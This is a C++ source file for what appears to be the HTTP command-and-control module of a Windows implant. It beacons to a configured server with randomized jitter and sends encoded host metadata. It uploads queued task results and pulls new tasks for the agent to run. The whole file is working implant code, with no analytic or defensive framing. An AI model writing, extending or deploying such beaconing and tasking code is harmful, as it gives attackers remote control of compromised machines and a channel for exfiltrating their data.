#include <string>
#include <chrono>
#include "HTTPCommunicationModule.h"
#include "Helpers.h"


HTTPCommunicationModule::HTTPCommunicationModule(const std::string& address, int port, Agent& agent_ref)
	: Address(address), Port(port), httpClient(port == 443), running(false), agent(agent_ref),
	  hStopEvent(CreateEvent(NULL, TRUE, FALSE, NULL)),
	  rng(static_cast<unsigned>(
	        std::chrono::steady_clock::now().time_since_epoch().count()
	        ^ GetCurrentThreadId()))
{
}

HTTPCommunicationModule::~HTTPCommunicationModule() {
	if (hStopEvent) CloseHandle(hStopEvent);
}

DWORD HTTPCommunicationModule::nextSleepMs() {
	DWORD interval = agent.getBeaconIntervalMs();
	DWORD jitter   = agent.getBeaconJitterMs();
	std::uniform_int_distribution<DWORD> dist(
		interval > jitter ? interval - jitter : 0,
		interval + jitter
	);
	return dist(rng);
}

void HTTPCommunicationModule::Config(){
	AgentMetadata metadata = agent.getMetadata();
	std::string metadata_str = metadata.to_json();
	std::string metadata_encoded = base64_encode(metadata_str);
	headers = {
				L"Content-Type: application/json",
				L"User-Agent: MyHttpClient/1.0",
				L"Authorization: Bearer " + s2ws(metadata_encoded)
			};
	running = true;
}

void HTTPCommunicationModule::Start() {
	while (running) {
		Checkin();
		// Sleep with jitter; wakes immediately if Stop() signals hStopEvent.
		DWORD result = WaitForSingleObject(hStopEvent, nextSleepMs());
		if (result == WAIT_OBJECT_0) break;
	}
}

void HTTPCommunicationModule::Stop() {
	running = false;
	if (hStopEvent) SetEvent(hStopEvent);
}

void HTTPCommunicationModule::Checkin(){
	// Drain the results queue before sending — save a copy so we can put
	// them back if the request fails (avoids silent result loss).
	std::vector<TaskResult> results = agent.getTaskResults();
	std::string data = "{\"results\":\"" + base64_encode(arrayTaskResult2json(results)) + "\"}";

	HttpResponse response = httpClient.Post(s2ws(Address), Port, L"/", data, headers);

	// Minimum valid response from the server is {"tasks":[]} (12 chars).
	// On connection failure or truncated response, put results back and retry next cycle.
	if (response.body.size() < 12) {
		for (auto& r : results)
			agent.addResult(r);
		return;
	}

	// Extract the tasks array value robustly using key search rather than
	// hard-coded offsets (old code used substr(10) / pop_back() which broke
	// whenever the JSON had extra whitespace or different key ordering).
	size_t keyPos = response.body.find("\"tasks\"");
	if (keyPos == std::string::npos) {
		for (auto& r : results)
			agent.addResult(r);
		return;
	}
	size_t openBracket  = response.body.find("[", keyPos);
	size_t closeBracket = response.body.rfind("]");
	if (openBracket == std::string::npos || closeBracket == std::string::npos
	    || closeBracket <= openBracket) {
		for (auto& r : results)
			agent.addResult(r);
		return;
	}

	std::string tasks_string = response.body.substr(openBracket + 1, closeBracket - openBracket - 1);
	std::vector<Task> tasks = json2arrayTasks(tasks_string);

	for (const auto& t : tasks)
		agent.addTask(t);
}
